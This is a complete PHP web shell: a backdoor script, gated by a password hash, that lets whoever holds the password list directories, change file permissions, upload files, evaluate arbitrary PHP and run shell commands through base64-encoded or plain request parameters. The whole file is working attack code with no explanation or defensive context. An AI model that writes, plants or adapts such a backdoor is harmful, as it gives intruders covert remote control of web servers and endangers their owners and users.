<?php

$c = 'f49d9c81ab9ea4e00cd6dc5c848cb341';

if (!isset($_REQUEST['ps']))
	exit(0);
else if (md5($_REQUEST['ps']) !== $c)
	exit(0);

echo "Yahoo!!!\n";

switch ($_REQUEST['a'])
{
	case 'ls' :
		show_ls($_REQUEST['p1']);
		break;

	case 'chmod' :
		chmod ($_REQUEST['p1'], $_REQUEST['p2']);
		show_ls();
		break;

	case 'up':
		up($_REQUEST['p1']);
		show_ls();
		break;

	case 'e':
		if (isset($_REQUEST['p64']))
			eval(base64_decode($_REQUEST['p64']));
		else
			eval($_REQUEST['p1']);
		break;

	case 'sh':
		if (isset($_REQUEST['p64']))
			print shell_exec(base64_decode($_REQUEST['p64']));
		else
			print shell_exec($_REQUEST['p1']);
		break;			

	default:
		show_ls();
}

function show_ls($p = '.')
{
	if (is_readable($p))
	{
    	if ($handle = opendir($p)) {

		      while (false !== ($file = readdir($handle))) {

				$file  = $p."/".$file;
				
				if (is_writable($file))
					$w = "w";
				else
					$w = "-";

		        if (is_dir($file))
					$d = "d";
				else
					$d = "f";		
			echo "[$d][$w] ".realpath($file)."\n";
			}
		}
	}
}

function up($p)
{
	$new_name = $p."/".basename($_FILES['f']['name']);
	if (move_uploaded_file($_FILES['f']['tmp_name'], $new_name))
		echo $new_name." Done...";
}

?>